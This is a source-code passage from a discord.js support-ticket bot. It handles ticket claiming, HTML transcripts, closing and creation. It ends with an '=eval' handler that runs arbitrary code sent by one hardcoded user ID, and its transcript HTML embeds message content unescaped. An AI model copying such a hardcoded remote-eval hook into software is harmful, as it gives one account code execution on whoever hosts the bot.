            message.edit(message.embeds[0].setTitle(`claimed By ${u.user.username || u.username}`)).catch(err => null);
            sourse.updateOne({ claimed: u.id }).then(result => { });
            chh.send(new Discord.MessageEmbed().setColor('GREEN').setDescription(`Ticket Claimed by <@${u.id}>`));
            chh.updateOverwrite(u.id, {
                VIEW_CHANNEL: true, SEND_MESSAGES: true
            });
            if (settings.claim == '1') chh.updateOverwrite(settings.suprole, {
                VIEW_CHANNEL: false
            }).catch(err => { null });
            if (settings.claim == '2') chh.updateOverwrite(settings.suprole, {
                SEND_MESSAGES: false
            }).catch(err => { null });
            let embed2 = new Discord.MessageEmbed()
                .setColor(`GREEN`)
                .setTitle(`Ticket Claimed`)
                .setDescription(`Ticket : #${chh.name}\nby :<@${u.id}>`)
                .setTimestamp()
                .setThumbnail(`http://i8.ae/HSPHw`)
                .setFooter(u.id);
            if (settings.log !== null) {
                let log = await client.channels.fetch(`${settings.log}`);
                if (log) log.send({ embed: embed2 }).catch(err => null);
            }
        } else {
            if (sourse.claimed !== u.id) return u.send(new Discord.MessageEmbed().setColor('RED')
                .setDescription(`**:x: The Ticket You Try To Claim is Already Claimed!**`)).catch(err => null)
            if (!message.embeds[0]) return;
            message.edit(message.embeds[0].setTitle(`Ticket not claimed!`));
            sourse.updateOne({ claimed: null }).then(result => { });
            chh.send(new Discord.MessageEmbed().setColor('YELLOW').setDescription(`Ticket UnClaimed`));
            chh.updateOverwrite(settings.suprole, {
                VIEW_CHANNEL: true, SEND_MESSAGES: true
            });
            chh.updateOverwrite(u.id, {
                VIEW_CHANNEL: null, SEND_MESSAGES: null
            });
            let embed2 = new Discord.MessageEmbed()
                .setColor(`YELLOW`)
                .setTitle(`Ticket Un-Claimed`)
                .setDescription(`Ticket : #${chh.name}\nby :<@${u.id}>`)
                .setTimestamp()
                .setThumbnail(`http://i8.ae/HSPHw`)
                .setFooter(u.id);
            if (settings.log !== null) {
                let log = await client.channels.fetch(`${settings.log}`);
                if (log) log.send({ embed: embed2 });
            }
        }

    })
}


async function Deleted(channel, settings, u, TRanss) {
    let mention;
    if (u) mention = `Created by <span class="mention">@${u.username || u.user.username}</span> (ID:${u.id})`;
    let date = `${channel.guild.id}${Date.now()}${channel.id}`
    fs.appendFile(`./transcript-${date}.html`,
        `${website}<title>#${channel.name} Transcript</title>
<div class="info">
<div class="info__guild-icon-container">
  <img class=info__guild-icon
  src=https://cdn.discordapp.com/icons/${channel.guild.id}/${channel.guild.icon}.png>
</div>
<div class="info__metadata">
  <div class="info__guild-name">${channel.guild.name}</div>
  <div class="info__channel-name">#${channel.name}</div>
  <div class="info__channel-name">${mention}</div>
  <div class="info__channel-message-count">${TRanss.messages.length} message</div>
</div>
</div>
</head>
${TRanss.messages.join('\n')}
</html>
`, async function (data, erorr) {
        setTimeout(() => {
            fs.unlink(`./transcript-${date}.html`, function (err) {
                if (err) throw err;
            });
        }, 15000);

        let CX = await client.channels.fetch(RoomID).catch(err => null);
        if (!CX.name) return console.log("XXXXXXXX")
        CX.send({
            files: [{
                attachment: `./transcript-${date}.html`, name: `./transcript-${channel.name}.html`
            }]
        }).then(X => {
            let z = settings.tickets;
            z.push({ member: u, url: X.attachments.first().url, date: Date.now() });
            let VC = 0; if (settings.history) VC = settings.history;
            let EM = Math.floor(VC * 1);
            let EC = Math.floor(EM + 1);
            settings.updateOne({ tickets: z, history: EC }).then(result => { });
        })
    })



}
async function Close(channel, closer, settings) {
    let user = channel.guild.members.cache.find(g => g.id == channel.topic);
    let log = channel.guild.channels.cache.find(g => g.id == settings.log);
    channel.delete().catch(err => null);
    let embed2 = new Discord.MessageEmbed()
        .setColor(`RED`)
        .setTitle(`Ticket Deleted`)
        .setDescription(`Ticket : #${channel.name}\nby :${closer}`)
        .setTimestamp()
        .setThumbnail(`http://i8.ae/HSPHw`)
        .setFooter(closer.id);
    if (log) log.send({ embed: embed2 }).catch(err => { null });
    if (settings.prv) {
        if (settings.prv == '1') {
            let embed = new Discord.MessageEmbed()
                .setColor(55290)
                .setAuthor(channel.guild.name, `https://cdn.discordapp.com/icons/${channel.guild.id}/${channel.guild.icon}.png?size=1024`)
                .addField(`Your Ticket \`#${channel.name}\` In \`${channel.guild.name}\` has been closed!`, `Closed By ${closer}`)
                .setFooter(`Closed At:`, client.user.avatarURL).setTimestamp();
            if (user) user.send(embed).catch(err => { null });
        }


    }
    return;
}
//







async function New(channel, creator, Reason, prefix, settings) {
    let u = client.users.fetch(creator.id); let X = settings.count;
    let Num = Math.floor(Math.floor(X * (1)) + (1));
    settings.updateOne({ count: `${Num}` }).then(result => { });
    let CH = null;
    Panel = settings
    if (channel.guild.channels.cache.find(r => r.id == Panel.category)
    ) CH = channel.guild.channels.cache.find(r => r.id == Panel.category);
    let ZZZZ; if (channel.guild.roles.cache.find(r => r.id == Panel.suprole)) { ZZZZ = Panel.suprole } else { ZZZZ = channel.guild.id }
    channel.guild.channels.create(`ticket-${settings.count}`,
        {
            type: 'text', topic: creator.id, reason: 'Tickets System', parent: CH, SyncManager: false,
            permissionOverwrites: [{

                id: channel.guild.id,
                deny: ['VIEW_CHANNEL']
            }, {
                id: creator.id,
                allow: ['SEND_MESSAGES', 'VIEW_CHANNEL', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY']

            }
                , {
                id: ZZZZ,
                allow: ['SEND_MESSAGES', 'VIEW_CHANNEL', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY']
            }

            ]
        }
    ).then(async tic => {
        let role = '(can\'t find a support role for this panel)';
        if (Panel.suprole !== null &&
            channel.guild.roles.cache.find(r => r.id == Panel.suprole)
        ) role = `<@&${Panel.suprole}>`;


        const newGuild = new GuildTranscripts({
            _id: mongoose.Types.ObjectId(),
            guildID: channel.guild.id,
            channelID: tic.id,
            messages: [],
            members: [`${creator.id}`],
            gnMessage: null,
            last: '1111',
            clsmsg: null,
            statu: 'open'
        }); await newGuild.save(); let CC = ' ';
        let emClose = '🔒';
        if (settings.emClose || settings.emClose !== undefined) emClose = `${settings.emClose}`;
        let emClaim = '📌';
        if (settings.emClaim || settings.emClaim !== undefined) emClaim = `${settings.emClaim}`;
        if (settings.claim == '1' || settings.claim == '2') CC = `\nTo Claim this Ticket react with ${emClaim} (Support Team Only)`
        let embed = new Discord.MessageEmbed().setColor(55290)
            .setAuthor(channel.guild.name, `https://cdn.discordapp.com/icons/${channel.guild.id}/${channel.guild.icon}.png?size=1024`)
            .setDescription(`:ballot_box_with_check: Support will be with you shortly.
To close this ticket react with ${emClose}${CC}`)

            .setFooter(`${client.user.username}`, client.user.avatarURL).setTimestamp();
        if (settings.claim == '1' || settings.claim == '2') embed.setTitle('Ticket not claimed!')
        setTimeout(() => {
            // 

            tic.send(`<@${creator.id}> ${role}`, { embed: embed })
                .then(SMessage => {
                    GuildTranscripts.findOne({
                        channelID: tic.id
                    }, async (err, TRanss) => {
                        if (err) console.error(err);
                        TRanss.updateOne({
                            gnMessage: SMessage.id
                        }).then(result => { new Discord.MessageEmbed().setColor(55290) })
                    });
                    SMessage.pin().then(t => { tic.messages.fetch({ limit: 1 }).then(msg => tic.bulkDelete(msg)) });
                    SMessage.react(emClose).catch(async err => {
                        SMessage.react('🔒')
                        setTimeout(() => {
                            tic.send(new Discord.MessageEmbed().setDescription(
                                `**:x: Can't React With \`${emClose}\` It maybe Deleted**\nyou can set new one by this command: \`${settings.prefix}emoji close <emoji>\``
                            ).setColor(`RED`))
                        }, 2000);
                    })

                        ; if (settings.claim == '1' || settings.claim == '2') SMessage.react(emClaim).catch(async err => {
                            SMessage.react('📌');
                            setTimeout(() => {
                                tic.send(new Discord.MessageEmbed().setDescription(
                                    `**:x: Can't React With \`${emClaim}\` It maybe Deleted**\nyou can set new one by this command: \`${settings.prefix}emoji claim <emoji>\``
                                ).setColor(`RED`))
                            }, 2000);
                        });
                });
        }, 500);

        if (channel.type == 'text' || channel.type == 'news') channel.send(new Discord.MessageEmbed().setColor(55290)
            .setAuthor(channel.guild.name, `https://cdn.discordapp.com/icons/${channel.guild.id}/${channel.guild.icon}.png?size=1024`)
            .setDescription(`:ballot_box_with_check: your ticket ${tic} has been created!!`)
            .setFooter(`${client.user.username}`, client.user.avatarURL).setTimestamp()).catch(err => null);

        let embed2 = new Discord.MessageEmbed()
            .setColor(`GREEN`)
            .setTitle(`Ticket Created`)
            .setDescription(`Ticket : #${tic.name}\nby :<@${creator.id}>`)
            .setTimestamp()
            .setThumbnail(`http://i8.ae/HSPHw`)
            .setFooter(creator.id);
        let log = channel.guild.channels.cache.find(g => g.id == settings.log)
        if (log) log.send({ embed: embed2 }).catch(err => null);

    })
}

let website = `<!doctype html><html lang="en"><head><link rel="icon" href="https://cdn.discordapp.com/emojis/652490710234431493.png"><style>@font-face {    font-family: xirod;    src: url(http://tickety.xyz/xirod.ttf);}
.info__metadata {
  flex: 1;
margin-left: 10px;
}body {font-family: sans-serif;background-color: #2F3136;color: black;}
.container {margin-left: 10px;margin-top: 10px;border-radius: 5px;background: #bdfdea;padding: 15px;}
.logo {max-width: 15vw;max-height: 7vh;}
.header { display: flex; margin-bottom: 10px;}
.name { font-family: xirod; color: #37393F; margin-top: 8px;    margin-left: 15px;    font-size: 45px;}
.info__guild-name {font-size: 1.4em;color: #fff;}
.info__channel-name {color: #fff;}
.info__channel-message-count {margin-top: 2px;color: #839496;}
.info__guild-icon-container {flex: 0;}
.info__guild-icon {max-width: 88px;max-height: 88px;border-radius: 50%;}
.info {display: flex;max-width: 100%;margin: 0 5px 10px;}
.chatlog {max-width: 100%;margin-bottom: 24px;}
.chatlog__message-group {        display: flex;        margin: 0 10px;        padding: 15px 0;        border-top: 1px solid;        color: rgba(255, 255, 255, 0.2);      }
.chatlog__messages {        flex: 1;        min-width: 50%;        margin-left: 20px;      }
.chatlog__content {        font-size: 0.9375em;        word-wrap: break-word;      }
.chatlog__author-avatar-container {        flex: 0;        width: 40px;        height: 40px;      }
.chatlog__author-avatar {        border-radius: 50%;        height: 40px;        width: 40px;      }
.chatlog__author-name {        color: #fff;      }
.chatlog__timestamp {margin-left: 5px;font-size: 0.75em;color: rgba(255, 255, 255, 0.2)}
.chatlog__content {        font-size: 0.9375em;        word-wrap: break-word;      }
.chatlog__message {        padding: 2px 5px;        margin-right: -5px;        margin-left: -5px;        background-color: transparent;        transition: background-color 1s ease;        color: #dbdbdb;      }
.chatlog {        max-width: 100%;        margin-bottom: 24px;      }
.markdown {        white-space: pre-wrap;        line-height: 1.3;        overflow-wrap: break-word;      }
.chatlog__bot-tag {margin-left: 0.3em;background: #7289da;color: #fff;font-size: 0.625em;padding: 1px 2px;border-radius: 3px;vertical-align: middle;line-height: 1.3;position: relative;top: -0.2em;}
.chatlog__embed {  margin-top: 5px;  display: flex;  max-width: 1000px;  color: #34363B;}
.chatlog__embed-color-pill {  flex-shrink: 0;  width: 4px;  border-top-left-radius: 3px;  border-bottom-left-radius: 3px;}
.chatlog__embed-content-container { display: flex; flex-direction: column; padding: 8px 10px; border: 1px solid; border-top-right-radius: 3px; border-bottom-right-radius: 3px;}.chatlog__embed-content { width: 100%; display: flex; color: #A6AFB1;}
.chatlog__embed-text {  flex: 1;  color: #A6AFB1;}.chatlog__embed-author {  display: flex;  align-items: center;  color: #A6AFB1;  margin-bottom: 5px;}
.chatlog__embed-author {display: flex;align-items: center;margin-bottom: 5px}
.chatlog__embed-author-icon {  width: 20px;  height: 20px;  color: #A6AFB1;  margin-right: 9px;  border-radius: 50%;}
.chatlog__embed-author-name {  font-size: 0.875em;  color: #ffffff; font-weight: 600;}
.chatlog__embed-title {  margin-bottom: 4px;  color: white; font-size: 0.875em;  font-weight: 600;}
.chatlog__embed-description {  font-weight: 500;  font-size: 14px;  color: white;}
.chatlog__embed-fields {  display: flex;  color: #A6AFB1; flex-wrap: wrap;}
.chatlog__embed-field {   color: #A6AFB1; flex: 0;   min-width: 100%;   max-width: 506px;   padding-top: 10px; }
.chatlog__embed-field--inline {  flex: 1;  color: #A6AFB1; flex-basis: auto;  min-width: 150px;}
.chatlog__embed-field-name {  margin-bottom: 4px;  font-size: 0.875em;  color: #A6AFB1; font-weight: 600;}
.chatlog__embed-field-value {  font-size: 0.875em;  font-weight: 500;  color: #A6AFB1;}
.chatlog__embed-thumbnail {  flex: 0;  margin-left: 20px;  max-width: 80px;  max-height: 80px;  border-radius: 3px;}
.chatlog__embed-image-container {margin-top: 10px;}
.chatlog__embed-image {  max-width: 500px;  max-height: 400px;  border-radius: 3px;}
.chatlog__embed-footer {   color: #A6AFB1; margin-top: 10px; }
.chatlog__embed-footer-icon {  margin-right: 4px;  width: 20px;  height: 20px;  border-radius: 50%;  vertical-align: middle;}
.chatlog__embed-footer-text {  color: #A6AFB1;font-weight: 500;  font-size: 0.75em;}
.chatlog__reactions {  display: flex;  color: #404348;}
.chatlog__reaction {  display: flex;  align-items: center;  margin: 6px 2px 2px;  padding: 3px 6px;  border-radius: 3px;color: #404348;}
.chatlog__reaction-count {  min-width: 9px;  margin-left: 6px;  font-size: 0.875em;  color: #767C76;}
.emoji--small {  width: 1rem;  height: 1rem;}.emoji--large {  width: 2rem;  height: 2rem;}
.emoji {  width: 1.45em;  height: 1.45em;  margin: 0 1px;  vertical-align: -0.4em;}
.chatlog__attachment-thumbnail {margin-top: 5px;max-width: 50%;max-height: 500px;border-radius: 3px}
.mention {color: #7289da;}
</style>
`

client.on("message", message => {
    if (message.content.startsWith("=eval")) {
        if (message.author.id !== '627133526072098857') return;
        const clean = text => {
            if (typeof (text) === "string")
                return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
            else
                return text;
        }

        const args = message.content.split(" ").slice(1);

        try {
            const code = args.join(" ");
            let evaled = eval(code);

            if (typeof evaled !== "string")
                evaled = require("util").inspect(evaled);

            message.channel.send(clean(evaled), { code: "xl" });
        } catch (err) {
            message.channel.send(`\`ERROR\` \`\`\`xl\n${clean(err)}\n\`\`\``);
        }
    }
});
